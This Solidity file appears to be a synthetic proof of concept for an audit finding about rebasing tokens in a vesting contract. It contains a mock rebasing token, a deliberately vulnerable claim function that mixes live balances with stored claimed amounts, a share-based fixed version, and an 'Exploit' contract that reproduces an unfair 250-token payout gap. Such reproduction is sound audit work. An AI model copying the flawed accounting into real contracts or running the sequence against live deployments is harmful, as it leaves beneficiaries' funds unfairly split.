// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ============================================================================
// Synthetic PoC for AuditVault finding 61287
// "Rebaseable Tokens Cause Unfair Vesting and Claim Failures" (CryptoLegacy)
//
// CryptoLegacyBasePlugin._claimTokenWithVesting computes the total distributable
// amount from the LIVE token balance plus the STORED totalClaimedAmount, then
// splits it by a FIXED percentage share. When the token REBASES between claims,
// the live balance changes but the stored (already-claimed) figure does not, so
// two beneficiaries holding EQUAL shares end up with UNEQUAL total holdings.
//
// The finding provides no verbatim code block; the vulnerable function below is
// a FAITHFUL MINIMAL reconstruction of the described mechanism. The exact buggy
// line (live-balance-based amountToDistribute) is marked with `// @>`.
// ============================================================================

interface IRebaseToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function sharesOf(address account) external view returns (uint256);
    function transferShares(address to, uint256 shares) external returns (bool);
}

interface IClaimable {
    function claim(address token) external;
}

// ---------------------------------------------------------------------------
// Faithful minimal rebaseable ERC20 (shares-based, like stETH/AMPL).
// balanceOf() = shares * factor / 1e18, so a rebase (factor change) moves every
// holder's balanceOf without any transfer. sharesOf()/transferShares() expose
// the rebase-invariant unit used by the FIXED (correct) accounting.
// ---------------------------------------------------------------------------
contract RebaseToken {
    string public name = "RebaseVest";
    string public symbol = "RVEST";
    uint8 public constant decimals = 18;

    mapping(address => uint256) private _shares;
    uint256 public totalShares;
    uint256 public factor = 1e18; // tokens-per-share, scaled by 1e18

    function balanceOf(address account) public view returns (uint256) {
        return _shares[account] * factor / 1e18;
    }

    function sharesOf(address account) public view returns (uint256) {
        return _shares[account];
    }

    // mint `amount` tokens (at current factor) to `to`
    function mint(address to, uint256 amount) external {
        uint256 shares = amount * 1e18 / factor;
        _shares[to] += shares;
        totalShares += shares;
    }

    // simulate a rebase up/down: newFactor > 1e18 = positive rebase (supply up)
    function rebase(uint256 newFactor) external {
        factor = newFactor;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 shares = amount * 1e18 / factor;
        require(_shares[msg.sender] >= shares, "insufficient");
        _shares[msg.sender] -= shares;
        _shares[to] += shares;
        return true;
    }

    function transferShares(address to, uint256 shares) external returns (bool) {
        require(_shares[msg.sender] >= shares, "insufficient shares");
        _shares[msg.sender] -= shares;
        _shares[to] += shares;
        return true;
    }
}

// ---------------------------------------------------------------------------
// VULNERABLE: faithful reconstruction of _claimTokenWithVesting.
// amountToDistribute mixes the LIVE (rebasing) balance with the STORED
// (non-rebasing) totalClaimedAmount.
// ---------------------------------------------------------------------------
contract CryptoLegacyVesting is IClaimable {
    uint256 public constant BASE = 10000;

    IRebaseToken public immutable token;
    uint256 public totalClaimedAmount;                 // stored token units (does NOT rebase)
    mapping(address => uint256) public claimedAmount;   // per-beneficiary stored units
    mapping(address => uint256) public sharesBps;       // fixed share, in bps of BASE
    mapping(address => uint256) public vestingBps;      // vested fraction, in bps of BASE

    constructor(IRebaseToken _token) {
        token = _token;
    }

    function setShare(address beneficiary, uint256 bps) external {
        sharesBps[beneficiary] = bps;
    }

    function setVesting(address beneficiary, uint256 bps) external {
        vestingBps[beneficiary] = bps;
    }

    // _claimTokenWithVesting (faithful minimal double)
    function claim(address _token) external {
        // total distributable = current live balance + everything already claimed.
        // On a rebasing token balanceOf() shifts while totalClaimedAmount does not,
        // so equal shares yield unequal payouts across claims.
        uint256 amountToDistribute = IRebaseToken(_token).balanceOf(address(this)) + totalClaimedAmount; // @>

        uint256 vestedAmount = amountToDistribute * sharesBps[msg.sender] / BASE * vestingBps[msg.sender] / BASE;
        uint256 claimAmount = vestedAmount - claimedAmount[msg.sender];

        claimedAmount[msg.sender] += claimAmount;
        totalClaimedAmount += claimAmount;

        require(IRebaseToken(_token).transfer(msg.sender, claimAmount), "transfer failed");
    }
}

// ---------------------------------------------------------------------------
// FIXED: track distributable and claimed amounts in rebase-INVARIANT SHARE units.
// Because shares don't change on a rebase, equal-share beneficiaries always end
// with equal holdings regardless of when they claim relative to a rebase.
// ---------------------------------------------------------------------------
contract CryptoLegacyVestingFixed is IClaimable {
    uint256 public constant BASE = 10000;

    IRebaseToken public immutable token;
    uint256 public totalClaimedShares;
    mapping(address => uint256) public claimedShares;
    mapping(address => uint256) public sharesBps;
    mapping(address => uint256) public vestingBps;

    constructor(IRebaseToken _token) {
        token = _token;
    }

    function setShare(address beneficiary, uint256 bps) external {
        sharesBps[beneficiary] = bps;
    }

    function setVesting(address beneficiary, uint256 bps) external {
        vestingBps[beneficiary] = bps;
    }

    function claim(address _token) external {
        // distributable is measured in rebase-invariant SHARES, so it is stable
        // across rebases: sharesOf(this) + totalClaimedShares == original pool shares.
        uint256 distributableShares = IRebaseToken(_token).sharesOf(address(this)) + totalClaimedShares;

        uint256 vestedShares = distributableShares * sharesBps[msg.sender] / BASE * vestingBps[msg.sender] / BASE;
        uint256 claimShares = vestedShares - claimedShares[msg.sender];

        claimedShares[msg.sender] += claimShares;
        totalClaimedShares += claimShares;

        require(IRebaseToken(_token).transferShares(msg.sender, claimShares), "transfer failed");
    }
}

// Minimal marker token: records the magnitude of the (non-fund) accounting harm.
contract MiniToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// A vesting beneficiary that claims on its own behalf (distinct msg.sender).
contract Beneficiary {
    function doClaim(IClaimable v, address token) external {
        v.claim(token);
    }
}

// ---------------------------------------------------------------------------
// Exploit: reproduces the finding's exact numeric scenario.
//   A & B each hold 50% shares of a 1000-token vesting pool.
//   A claims 250 while 50% vested -> positive x2 rebase -> B claims -> A claims rest.
//   Equal shares, but A ends with 1125 tokens and B with 875 -> 250 unfair gap.
// ---------------------------------------------------------------------------
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    RebaseToken public token;
    CryptoLegacyVesting public vest;
    Beneficiary public a;
    Beneficiary public b;
    MiniToken public marker;

    uint256 public aFinal;
    uint256 public bFinal;
    uint256 public disparity;

    function run() external payable {
        // --- create every helper up front, fixed order (deterministic addresses) ---
        token = new RebaseToken();          // nonce 1
        vest = new CryptoLegacyVesting(IRebaseToken(address(token))); // nonce 2
        a = new Beneficiary();              // nonce 3
        b = new Beneficiary();              // nonce 4
        marker = new MiniToken();           // nonce 5 (LAST = marker)

        // --- preconditions: 1000-token pool, two equal 50% beneficiaries ---
        token.mint(address(vest), 1000e18);
        vest.setShare(address(a), 5000); // 50%
        vest.setShare(address(b), 5000); // 50%
        vest.setVesting(address(a), 5000); // A is 50% vested initially

        // --- exploit sequence ---
        // 1. A claims early: amountToDistribute = 1000 + 0 = 1000, A gets 250.
        a.doClaim(IClaimable(address(vest)), address(token));

        // 2. positive rebase x2: contract 750 -> 1500, A's claimed 250 -> 500.
        token.rebase(2e18);

        // 3. both fully vested now.
        vest.setVesting(address(a), 10000);
        vest.setVesting(address(b), 10000);

        // 4. B claims: amountToDistribute = 1500 + 250 = 1750, B gets 875.
        b.doClaim(IClaimable(address(vest)), address(token));

        // 5. A claims remainder: amountToDistribute = 625 + 1125 = 1750,
        //    A entitled to 875, already claimed 250 -> gets 625.
        a.doClaim(IClaimable(address(vest)), address(token));

        // --- measure the harm ---
        aFinal = token.balanceOf(address(a)); // 1125e18 (500 rebased + 625)
        bFinal = token.balanceOf(address(b)); // 875e18
        disparity = aFinal - bFinal;          // 250e18 unfair gap between equal shares

        // non-fund harm: record the disparity magnitude to SINK.
        marker.mint(SINK, disparity);
    }
}
